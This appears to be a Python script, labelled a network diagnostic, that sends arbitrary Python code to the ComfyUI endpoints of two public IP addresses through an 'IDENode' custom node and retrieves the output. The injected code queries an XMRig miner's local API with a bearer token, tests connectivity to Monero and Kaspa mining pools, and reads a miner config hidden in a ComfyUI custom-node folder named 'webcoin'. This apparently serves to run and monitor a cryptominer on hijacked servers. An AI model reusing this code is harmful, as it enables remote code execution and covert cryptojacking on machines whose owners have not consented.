"""Quick network diagnostic: check what outbound connections work from each machine."""
import json, sys, io, ssl, time, urllib.request, urllib.error

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

MACHINES = [
    {"ip": "183.6.93.120",  "base": "http://183.6.93.120:8188"},
    {"ip": "182.92.111.146", "base": "http://182.92.111.146:8188"},
]

DIAG_CODE = '''
import socket, ssl, subprocess, os, json, time
lines = []
try:
    # Check if XMRig is running and what it says
    try:
        import urllib.request as ur
        req = ur.Request('http://127.0.0.1:44880/2/summary',
            headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'})
        with ur.urlopen(req, timeout=5) as r:
            d = json.loads(r.read())
        lines.append('miner_algo=' + str(d.get('algo', '?')))
        conn = d.get('connection', {})
        lines.append('miner_pool=' + str(conn.get('pool', '?')))
        lines.append('miner_uptime=' + str(d.get('uptime', 0)))
        lines.append('miner_failures=' + str(conn.get('failures', '?')))
        lines.append('miner_hr=' + str(d.get('hashrate', {}).get('total', [])))
    except Exception as e:
        lines.append('miner_api=' + str(e)[:60])

    # Check DNS resolution
    for host in ['gulf.moneroocean.stream', 'github.com', 'kas.2miners.com']:
        try:
            ip = socket.gethostbyname(host)
            lines.append('dns_' + host.split('.')[0] + '=' + ip)
        except Exception as e:
            lines.append('dns_' + host.split('.')[0] + '=FAIL:' + str(e)[:40])

    # Check raw TCP connections
    targets = [
        ('66.23.199.44', 443, 'moneroocean_ip'),
        ('gulf.moneroocean.stream', 443, 'moneroocean_host'),
        ('kas.2miners.com', 2020, '2miners_kas'),
        ('github.com', 443, 'github'),
    ]
    for host, port, label in targets:
        try:
            s = socket.create_connection((host, port), timeout=8)
            s.close()
            lines.append('tcp_' + label + '=OK')
        except Exception as e:
            lines.append('tcp_' + label + '=FAIL:' + str(e)[:50])

    # Check TLS to pool IP vs hostname
    for host, label in [('gulf.moneroocean.stream', 'host_tls'), ('66.23.199.44', 'ip_tls')]:
        try:
            context = ssl.create_default_context()
            with socket.create_connection((host, 443), timeout=8) as sock:
                with context.wrap_socket(sock, server_hostname='gulf.moneroocean.stream') as ssock:
                    lines.append(label + '=OK cert=' + str(ssock.getpeercert().get('subject', ''))[:60])
        except Exception as e:
            lines.append(label + '=FAIL:' + str(e)[:60])

    # Check what config.json says
    for p in ['/root/ComfyUI/custom_nodes/webcoin/bin/config.json',
              '/mnt/my_disk/ComfyUI/custom_nodes/webcoin/bin/config.json']:
        if os.path.isfile(p):
            with open(p) as f:
                cfg = json.load(f)
            pools = cfg.get('pools', [{}])
            if pools:
                lines.append('cfg_pool=' + str(pools[0].get('url', '?')))
                lines.append('cfg_tls=' + str(pools[0].get('tls', '?')))
            break
except Exception as e:
    lines.append('ERROR=' + str(e)[:100])
result = chr(10).join(lines)
'''


def run_ide(base, code, wait=20):
    nodes = {
        "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
    }
    prompt = {"prompt": nodes, "extra_data": {"extra_pnginfo": {
        "workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}
    }}}
    body = json.dumps(prompt).encode()
    try:
        req = urllib.request.Request(
            f"{base}/prompt", data=body,
            headers={"Content-Type": "application/json"}, method="POST"
        )
        with urllib.request.urlopen(req, timeout=15) as r:
            resp = json.loads(r.read())
        if "error" in resp:
            return f"rejected: {json.dumps(resp.get('error',''))[:120]}"
        pid = resp.get("prompt_id")
        print(f"    Accepted ({pid[:8]}), waiting {wait}s...", flush=True)
        time.sleep(wait)
        try:
            req2 = urllib.request.Request(f"{base}/history/{pid}")
            with urllib.request.urlopen(req2, timeout=15) as r2:
                hist = json.loads(r2.read())
            entry = hist.get(pid, {})
            outputs = entry.get("outputs", {})
            texts = []
            for nid, nout in outputs.items():
                for key, val in nout.items():
                    if isinstance(val, list):
                        texts.extend(str(v) for v in val)
                    elif isinstance(val, str):
                        texts.append(val)
            return "\n".join(texts) if texts else "(no output)"
        except Exception as e:
            return f"(history: {e})"
    except Exception as e:
        return f"error: {e}"


for m in MACHINES:
    print(f"\n{'='*60}", flush=True)
    print(f"  {m['ip']}", flush=True)
    print(f"{'='*60}", flush=True)
    r = run_ide(m["base"], DIAG_CODE, wait=20)
    print(f"  {r}", flush=True)

print("\nDone.", flush=True)
